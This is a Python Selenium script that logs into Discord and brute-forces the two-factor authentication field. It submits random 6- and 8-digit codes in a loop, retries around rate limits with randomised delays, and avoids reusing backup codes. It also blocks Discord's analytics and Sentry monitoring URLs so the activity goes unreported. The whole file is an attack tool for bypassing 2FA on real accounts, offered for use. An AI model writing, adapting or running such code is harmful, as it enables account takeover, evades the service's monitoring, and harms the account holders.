# Import dependencies and libraries
import time
import secrets
from src.lib.codegen import genRandomCode
from src.lib.textcolor import color

# Import Selenium libraries and dependencies
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, InvalidSessionIdException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

def browserBootstrap(
	cfg: dict,
) -> webdriver.chrome.webdriver.WebDriver:
	"""
	browserBootstrap is a function that initializes and returns a WebDriver object of the Chrome browser. 
	:param cfg: a dictionary object which holds the program mode as key-value pairs. 
	:type cfg: dict
	:return: a WebDriver object of the Chrome browser.
	:rtype: webdriver.chrome.webdriver.WebDriver
	"""
	# Set Chromium options.
	options = Options()
	options.add_experimental_option('excludeSwitches', ['enable-logging'])
	options.add_experimental_option(         'detach', True)
	options.add_argument("--lang=en-US") # Force the browser window into English so we can find the code XPATH 

	# If you want to run the program without the browser opening then remove the # from the options below 
	#options.add_argument('--headless')
	#options.add_argument('--log-level=1')

	# Get and initialize the most up-to-date Chromium web driver
	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
	#Blocking various Discord analytics/monitoring URLS so they don't phone home
	driver.execute_cdp_cmd('Network.setBlockedURLs', {
		'urls': [
			'a.nel.cloudflare.com/report', 
			'https://discord.com/api/v10/science',
			'sentry.io'
		]
	})
	# Enable the network connectivity of the browser
	driver.execute_cdp_cmd('Network.enable', {})

	# Go to the appropriate starting page for the mode
	match cfg['programMode']:
		case 'login':
			# Go to the discord login page
			driver.get('https://www.discord.com/login')
		case 'reset':
			# Go to the discord page
			driver.get('https://discord.com/reset#token=' + cfg['resetToken'])
	# Wait 1 second before typing the email and password
	time.sleep(1)
	return driver

def loginBootstrap(
	driver: webdriver.chrome.webdriver.WebDriver,
	cfg: dict,
):
	"""
	Login Bootstrap is a function that takes in two parameters:
	1. driver: A web driver object of Chrome
	2. cfg: A dictionary of configuration keys and values
	The function locates the login input fields based on the `cfg` parameter's `programMode`. If `programMode` is 'login',
	the email and password fields are located, and the values of the fields are filled using `cfg`. If `programMode` is 'reset',
	only the password field is located and filled in with the `newPassword` key from `cfg`. The function then attempts to find
	a TOTP login field, and if found, calls the `codeEntry()` function to enter the authentication code. If a `NoSuchElementException`
	is caught while trying to find the TOTP login field, the function continues to run, assuming that the hCaptcha has been completed.
	"""
	# Find the login input fields
	loginFields = {
		'password': driver.find_element(by=By.NAME, value='password')
	}
	match cfg['programMode']:
		case 'login':
			loginFields['email'] = driver.find_element(by=By.NAME, value='email')
			# Enter the email and password. 
			#Uses jugaad syntax to get and fill in the email and password user details in the appropriate field.
			for i in loginFields:
				loginFields[i].send_keys(cfg[i])
		case 'reset':
			# Enter the new password
			loginFields['password'].send_keys(cfg['newPassword'])
	
	# Click Enter/Return to submit the user details
	loginFields['password'].send_keys(Keys.RETURN)

	# Start code entering

	#loginTOTP = otp input field. TOTP stands for Timed One Time Password
	# Constantly run the script.
	while (True):
		# Attempt to find the TOTP login field
		try:
			loginFields['TOTP'] = driver.find_element(by=By.XPATH, value="//input[@placeholder='6-digit authentication code/8-digit backup code']") #or driver.find_element(by=By.XPATH, value="//*[@aria-label='Enter Discord Auth/Backup Code']")
			# Auto-triggers the password reset flow
			if ('Please reset your password to log in.' in driver.page_source):
				cfg['programMode'] = 'reset'
				codeEntry(driver, loginFields, cfg)
			codeEntry(driver, loginFields, cfg)
		except NoSuchElementException: # This try-except block constantly checks whether the hCaptcha has been completed, and if so, it will continue to the next phase.
			pass
		except InvalidSessionIdException: # If the browser window is closed stop looking for TOTP login field 
			break
def codeEntry(
	     driver: webdriver.chrome.webdriver.WebDriver,
	loginFields: dict,
	     cfg: dict
):
	"""
	Enter OTP codes continuously until successful login, using the provided webdriver, 
	loginFields dictionary, and configuration dictionary. Returns nothing. 

	:param driver: A webdriver object.
	:type driver: webdriver.chrome.webdriver.WebDriver
	:param loginFields: A dictionary of login fields.
	:type loginFields: dict
	:param cfg: A dictionary of configuration values.
	:type cfg: dict
	"""
	# Set up statistics counters
	statistics = {
		'attemptedCodeCount':   0,
		    'ratelimitCount':   0,
		       'elapsedTime': 0.0,
		       'programMode':  '',
		          'codeMode':  '',
	}

	#Logic to continuously enter OTP codes
	time.sleep(0.3)
	startTime = time.time()
	sleepDuration = 0
	while (True):
		# Inform user TOTP field was found
		if statistics['attemptedCodeCount'] == 0:
			for i in cfg:
				statistics[i] = cfg[i]
				print(f"{color(i, 'green')}: {statistics[i]}")
			print(f"TOTP login field: {color('Found','green')}")
			print(f"Forcer: {color('Starting','green')}")
			print(f"Program Mode: {color(cfg['programMode'], 'green')}")
			print(f"Code Mode: {color(cfg['codeMode'], 'green')}")

		# Generate a new code and enter it into the TOTP field
		totpCode = genRandomCode(cfg['codeMode'])
		
		# Use the 8-digit code only if it's not in the usedcodes.txt list
		if len(totpCode) == 8:
			with open('user/usedcodes.txt', 'a+') as f:
				f.seek(0)
				usedcodes = f.read() 
				if totpCode in usedcodes:
					continue
				else:
					f.write(f"{totpCode}\n")

		# Send the code
		loginFields['TOTP'].send_keys(totpCode)
		loginFields['TOTP'].send_keys(Keys.RETURN)
		statistics['attemptedCodeCount'] += 1
		time.sleep(0.3) # Wait for page to update so we can detect changes such as rate limited.   

		if ('The resource is being rate limited.' in driver.page_source):
			sleepDuration = secrets.choice(range(7, 12))
			statistics['ratelimitCount'] += 1
			print(f"Code: {color(totpCode, 'blue')} was {color('Ratelimited', 'yellow')} will retry in {color(sleepDuration, 'blue')}")
			time.sleep(sleepDuration)
			loginFields['TOTP'].send_keys(Keys.RETURN)
			sleepDuration = secrets.choice(range(6, 10))

		if ('Token has expired' in driver.page_source): 
			#Print this out as well as some statistics, and prompt the user to retry.
			statistics['elapsedTime'] = time.time() - startTime
			finalStatDisplay('invalidPasswordResetToken', statistics)
			# Close the browser and stop the script.
			driver.close()
			break
			
		# This means that Discord has expired this login session, we must restart the process.
		elif ('Invalid two-factor auth ticket' in driver.page_source):
			#  Print this out as well as some statistics, and prompt the user to retry.
			statistics['elapsedTime'] = time.time() - startTime
			finalStatDisplay('invalidSessionTicket', statistics)
			# Close the browser and stop the script.
			driver.close()
			break

		# The entered TOTP code is invalid. Wait a few seconds, then try again.
		else:
			sleepDuration = secrets.choice(range(6, 10))
		#Testing if the main app UI renders.
		try:
			# Wait 1 second, then check if the Discord App's HTML loaded by it's CSS class name. If loaded, then output it to the user.
			time.sleep(1)
			loginTest = driver.find_element(by=By.CLASS_NAME, value='app-2CXKsg')
			print(color(f"Code {totpCode} worked!"))
			break
		except NoSuchElementException:
			# This means that the login was unsuccessful so let's inform the user and wait.
			print(f"Code: {color(totpCode, 'blue')} did not work, delay: {color(sleepDuration, 'blue')}")
			time.sleep(sleepDuration)
			# Backspace the previously entered TOTP code.
			for i in range(len(totpCode)):
				loginFields['TOTP'].send_keys(Keys.BACKSPACE)

def finalStatDisplay(
	haltReason: str,
	statistics: dict
):
	"""
	Displays statistics and the reason for program halt.

	:param haltReason: A string representing the reason why the program halted.
	:type haltReason: str
	:param statistics: A dictionary containing statistical data.
	:type statistics: dict
	:return: This function does not return anything.
	"""
	haltReasons = {
			 'invalidSessionTicket': 'Invalid session ticket',
		'invalidPasswordResetToken': 'Invalid password reset token',
			'passwordResetRequired': 
									f"We need to reset the password!\n"\
									f"Running {color('reset program mode', 'green')}!\n"\
									f"{color('(This feature will only work if the resetToken is filled in the .env file.)', 'yellow')}"
	}
	print(color(f"Halt reason:            {         haltReasons[haltReason]}", 'red' ))
	print(color(f"Program mode:           {       statistics['programMode']}", 'blue'))
	print(color(f"Code mode:              {          statistics['codeMode']}", 'blue'))
	print(color(f"Number of tried codes:  {statistics['attemptedCodeCount']}", 'blue'))
	print(color(f"Time elapsed for codes: {       statistics['elapsedTime']}", 'blue'))
	print(color(f"Number of ratelimits    {    statistics['ratelimitCount']}", 'blue'))
